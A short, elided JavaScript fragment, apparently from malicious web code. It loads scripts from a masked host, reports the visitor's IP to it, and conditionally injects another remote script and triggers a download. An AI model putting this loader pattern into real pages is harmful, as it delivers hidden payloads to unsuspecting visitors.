...
document.write("<script src='http://xxxx/bobo.php?getaddr=123'></script>");
...
function isRise(ip,bobo) {
    ...
    xmlHttp.open("GET", "http://xxxx/bobo.php?search="+ip, "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
        ...
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            ...
            if (resData == "in" && bobo == "111111") {
				...
				document.write("<script src='http://xxxx/bobo.php?bobo=1'></script>");
                download();
            }
        }
    }
